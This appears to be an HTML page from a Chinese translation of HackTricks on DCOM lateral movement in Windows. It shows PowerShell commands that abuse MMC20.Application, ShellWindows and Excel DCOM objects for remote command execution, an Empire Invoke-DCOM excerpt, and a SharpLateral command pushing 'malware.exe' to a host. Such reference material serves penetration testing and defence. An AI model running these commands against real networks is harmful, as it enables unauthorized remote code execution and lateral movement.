@@ -1,0 +1,313 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>DCOM Exec</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="dcom-exec"><a class="header" href="#dcom-exec">DCOM Exec</a></h1>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<h2 id="mmc20application"><a class="header" href="#mmc20application">MMC20.Application</a></h2>
+<p><strong>有关此技术的更多信息，请查看原始帖子 <a href="https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/">https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/</a></strong></p>
+<p>分布式组件对象模型 (DCOM) 对象为基于网络的对象交互提供了有趣的能力。微软为 DCOM 和组件对象模型 (COM) 提供了全面的文档，访问 <a href="https://msdn.microsoft.com/en-us/library/cc226801.aspx">这里查看 DCOM</a> 和 <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx">这里查看 COM</a>。可以使用 PowerShell 命令检索 DCOM 应用程序列表：</p>
+<pre><code class="language-bash">Get-CimInstance Win32_DCOMApplication
+</code></pre>
+<p>The COM对象，<a href="https://technet.microsoft.com/en-us/library/cc181199.aspx">MMC应用程序类 (MMC20.Application)</a>，使得MMC插件操作的脚本化成为可能。值得注意的是，这个对象在<code>Document.ActiveView</code>下包含一个<code>ExecuteShellCommand</code>方法。关于这个方法的更多信息可以在<a href="https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx">这里</a>找到。检查它的运行：</p>
+<p>此功能通过DCOM应用程序促进了在网络上执行命令。要以管理员身份远程与DCOM交互，可以使用PowerShell，如下所示：</p>
+<pre><code class="language-powershell">[activator]::CreateInstance([type]::GetTypeFromProgID("&lt;DCOM_ProgID&gt;", "&lt;IP_Address&gt;"))
+</code></pre>
+<p>此命令连接到 DCOM 应用程序并返回 COM 对象的实例。然后可以调用 ExecuteShellCommand 方法在远程主机上执行进程。该过程涉及以下步骤：</p>
+<p>检查方法：</p>
+<pre><code class="language-powershell">$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
+$com.Document.ActiveView | Get-Member
+</code></pre>
+<p>获取 RCE：</p>
+<pre><code class="language-powershell">$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
+$com | Get-Member
+
+# Then just run something like:
+
+ls \\10.10.10.10\c$\Users
+</code></pre>
+<h2 id="shellwindows--shellbrowserwindow"><a class="header" href="#shellwindows--shellbrowserwindow">ShellWindows &amp; ShellBrowserWindow</a></h2>
+<p><strong>有关此技术的更多信息，请查看原始帖子 <a href="https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/">https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/</a></strong></p>
+<p><strong>MMC20.Application</strong> 对象被发现缺乏明确的 "LaunchPermissions"，默认为允许管理员访问的权限。有关更多详细信息，可以在 <a href="https://twitter.com/tiraniddo/status/817532039771525120">这里</a> 探索一个线程，并建议使用 <a href="https://twitter.com/tiraniddo">@tiraniddo</a> 的 OleView .NET 来过滤没有明确启动权限的对象。</p>
+<p>两个特定对象 <code>ShellBrowserWindow</code> 和 <code>ShellWindows</code> 因缺乏明确的启动权限而被强调。<code>HKCR:\AppID\{guid}</code> 下缺少 <code>LaunchPermission</code> 注册表项表示没有明确的权限。</p>
+<h3 id="shellwindows"><a class="header" href="#shellwindows">ShellWindows</a></h3>
+<p>对于缺乏 ProgID 的 <code>ShellWindows</code>，可以使用 .NET 方法 <code>Type.GetTypeFromCLSID</code> 和 <code>Activator.CreateInstance</code> 通过其 AppID 实例化对象。此过程利用 OleView .NET 检索 <code>ShellWindows</code> 的 CLSID。一旦实例化，可以通过 <code>WindowsShell.Item</code> 方法进行交互，从而调用方法，如 <code>Document.Application.ShellExecute</code>。</p>
+<p>提供了示例 PowerShell 命令以实例化对象并远程执行命令：</p>
+<pre><code class="language-powershell">$com = [Type]::GetTypeFromCLSID("&lt;clsid&gt;", "&lt;IP&gt;")
+$obj = [System.Activator]::CreateInstance($com)
+$item = $obj.Item()
+$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
+</code></pre>
+<h3 id="lateral-movement-with-excel-dcom-objects"><a class="header" href="#lateral-movement-with-excel-dcom-objects">Lateral Movement with Excel DCOM Objects</a></h3>
+<p>侧向移动可以通过利用 DCOM Excel 对象来实现。有关详细信息，建议阅读 <a href="https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom">Cybereason's blog</a> 上关于通过 DCOM 利用 Excel DDE 进行侧向移动的讨论。</p>
+<p>Empire 项目提供了一个 PowerShell 脚本，演示了通过操纵 DCOM 对象利用 Excel 进行远程代码执行 (RCE)。以下是来自 <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1">Empire's GitHub repository</a> 的脚本片段，展示了滥用 Excel 进行 RCE 的不同方法：</p>
+<pre><code class="language-powershell"># Detection of Office version
+elseif ($Method -Match "DetectOffice") {
+$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
+$Obj = [System.Activator]::CreateInstance($Com)
+$isx64 = [boolean]$obj.Application.ProductCode[21]
+Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
+}
+# Registration of an XLL
+elseif ($Method -Match "RegisterXLL") {
+$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
+$Obj = [System.Activator]::CreateInstance($Com)
+$obj.Application.RegisterXLL("$DllPath")
+}
+# Execution of a command via Excel DDE
+elseif ($Method -Match "ExcelDDE") {
+$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
+$Obj = [System.Activator]::CreateInstance($Com)
+$Obj.DisplayAlerts = $false
+$Obj.DDEInitiate("cmd", "/c $Command")
+}
+</code></pre>
+<h3 id="automation-tools-for-lateral-movement"><a class="header" href="#automation-tools-for-lateral-movement">Automation Tools for Lateral Movement</a></h3>
+<p>两个工具被强调用于自动化这些技术：</p>
+<ul>
+<li>
+<p><strong>Invoke-DCOM.ps1</strong>：由Empire项目提供的PowerShell脚本，简化了在远程机器上执行代码的不同方法的调用。该脚本可以在Empire GitHub存储库中访问。</p>
+</li>
+<li>
+<p><strong>SharpLateral</strong>：一个用于远程执行代码的工具，可以使用以下命令：</p>
+</li>
+</ul>
+<pre><code class="language-bash">SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
+</code></pre>
+<h2 id="自动化工具"><a class="header" href="#自动化工具">自动化工具</a></h2>
+<ul>
+<li>Powershell 脚本 <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1"><strong>Invoke-DCOM.ps1</strong></a> 允许轻松调用所有评论中提到的在其他机器上执行代码的方法。</li>
+<li>你也可以使用 <a href="https://github.com/mertdas/SharpLateral"><strong>SharpLateral</strong></a>:</li>
+</ul>
+<pre><code class="language-bash">SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
+</code></pre>
+<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
+<ul>
+<li><a href="https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/">https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/</a></li>
+<li><a href="https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/">https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/</a></li>
+</ul>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a>** 上关注我们。**</li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../windows-hardening/lateral-movement/atexec.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../windows-hardening/lateral-movement/psexec-and-winexec.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../windows-hardening/lateral-movement/atexec.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../windows-hardening/lateral-movement/psexec-and-winexec.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
